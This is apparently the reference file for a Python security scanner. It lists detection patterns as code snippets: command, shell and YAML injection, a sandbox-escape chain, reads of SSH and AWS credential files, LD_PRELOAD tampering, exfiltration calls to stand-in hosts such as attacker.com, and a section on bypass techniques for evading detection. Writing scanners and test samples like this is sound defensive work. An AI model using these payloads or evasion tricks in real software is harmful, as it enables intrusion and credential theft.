# Vulnerability Patterns Reference

Quick reference for all 40+ detection patterns in Security Scanner v2.0.

## CRITICAL Patterns

### 1. Indirect Code Execution
```python
# Pattern: getattr with function names
getattr(os, 'sys' + 'tem')('cmd')
getattr(__builtins__, 'ex' + 'ec')('code')

# Pattern: Dictionary obfuscation
{'cmd': os.system}['cmd']('evil')

# Pattern: Lambda wrapping
(lambda: os.system('cmd'))()
```

### 2. Command Injection
```python
os.system(user_input)
subprocess.call(cmd, shell=True)
eval(user_data)
exec(code_string)
```

### 3. Shell Injection (without shell=True)
```python
subprocess.run(['/bin/bash', '-c', cmd])
subprocess.run(['python3', '-c', code])
subprocess.run(['perl', '-e', code])
subprocess.run(['awk', 'BEGIN{system("cmd")}'])
```

### 4. YAML Injection
```yaml
config: !!python/object/apply:os.system ["cmd"]
data: !<tag:yaml.org,2002:python/object/apply:subprocess.Popen>
__proto__: {isAdmin: true}
```

### 5. Credential Theft
```python
open('~/.ssh/id_rsa').read()
open('~/.aws/credentials').read()
open('~/.netrc').read()
```

### 6. Sandbox Escape
```python
().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['os'].system('cmd')
[].__class__.__base__.__subclasses__()[127].__init__.__globals__['__builtins__']['exec']
```

### 7. Typosquatting
```python
import request   # vs requests
import urlib     # vs urllib
import numppy    # vs numpy
import beatifulsoup  # vs beautifulsoup4
```

## HIGH Patterns

### 8. Advanced Encoding
```python
# ROT13
codecs.decode('payload', 'rot_13')

# zlib
zlib.decompress(compressed)

# XOR
chr(ord(x) ^ key)

# AST manipulation
ast.parse(code); tree.body[0] = malicious
```

### 9. Time Bombs
```python
if datetime.datetime.now().day == 15:
    os.system('malicious')

if time.time() > timestamp:
    exec(payload)
```

### 10. Environment Manipulation
```python
os.environ['LD_PRELOAD'] = '/tmp/evil.so'
os.environ['PATH'] = '/tmp/evil:' + PATH
os.environ['PYTHONPATH'] = '/tmp/evil'
os.putenv('LD_LIBRARY_PATH', '/tmp/lib')
```

### 11. Import Hooks
```python
sys.meta_path.insert(0, MaliciousHook())
__builtins__.__import__ = malicious_import
```

### 12. Class Traversal
```python
__class__.__bases__[0].__subclasses__()
__class__.__mro__
type(obj).__subclasses__()
```

### 13. Data Exfiltration
```python
requests.post('attacker.com', data=secrets)
urllib.request.urlopen('evil.com?data=' + secrets)
socket.connect(('attacker.com', 4444))
```

## MEDIUM Patterns

### 14. Base64 Encoding
```python
exec(base64.b64decode(payload))
eval(base64.b64decode(obfuscated))
```

### 15. Hex Encoding
```python
bytes.fromhex(hex_string)
bytearray.fromhex(hex_data)
```

### 16. Hardcoded Secrets
```python
API_KEY = "sk-1234567890abcdef"
PASSWORD = "mysecretpassword"
TOKEN = "ghp_xxxxxxxxxxxx"
```

### 17. Unsafe Deserialization
```python
pickle.loads(untrusted_data)
marshal.loads(data)
yaml.load(content)  # vs yaml.safe_load()
```

### 18. File Path Traversal
```python
open('../../../etc/passwd')
open('/tmp/malicious')
open('~/sensitive_file')
```

## Detection Logic

### Pattern Matching
1. Regex-based initial detection
2. Context analysis (surrounding code)
3. Severity escalation based on combinations

### Example:
```python
# Base severity: MEDIUM
bytes.fromhex(hex_string)

# If followed by exec/eval within 5 lines: CRITICAL
bytes.fromhex(hex_string)
exec(...)
```

### Cross-File Analysis
- Track user input sources: `input()`, `sys.argv`, `request.args`
- Track dangerous sinks: `os.system`, `subprocess`, `exec`
- Flag if both exist across files

## Bypass Techniques (For Testing)

### String Manipulation
```python
# Concatenation
func_name = 'sys' + 'tem'
getattr(os, func_name)

# Formatting
getattr(os, '{}tem'.format('sys'))
```

### Encoding Chains
```python
# Multiple layers
payload = base64.b64decode(zlib.decompress(encrypted))
```

### Time Delays
```python
# Activate later
if datetime.now() > trigger_date:
    malicious_code()
```

### File Staging
```python
# File 1: Innocent helper
def decode(x): return x

# File 2: Malicious usage
decode(malicious) + execute()
```

## Remediation

### Safe Alternatives

❌ **Dangerous:**
```python
os.system(user_input)
```

✅ **Safe:**
```python
subprocess.run(['command', arg1, arg2], timeout=30)
```

❌ **Dangerous:**
```python
eval(user_data)
```

✅ **Safe:**
```python
ast.literal_eval(user_data)  # Only literals
```

❌ **Dangerous:**
```python
import request  # Typo
```

✅ **Safe:**
```python
import requests  # Correct package
```

## Testing Your Scanner

Create malicious samples for each pattern:

1. Indirect execution: `getattr(os, 'system')`
2. Command injection: `os.system()`
3. Shell injection: `subprocess.run(['/bin/bash', '-c'])`
4. YAML injection: `!!python/object`
5. Credential theft: `open('.ssh/id_rsa')`
6. Sandbox escape: `__class__.__bases__`
7. Typosquatting: `import request`
8. Advanced encoding: `codecs.decode(..., 'rot_13')`
9. Time bombs: `if datetime.now().day ==`
10. Environment: `os.environ['LD_PRELOAD']`
11. Import hooks: `sys.meta_path.insert`

Scanner should detect 100% of these patterns.

---

**For full implementations, see:**
- `tests/malicious_samples/` - Working examples
- `scripts/security_scanner.py` - Detection logic
- `scripts/test_scanner.py` - Verification suite
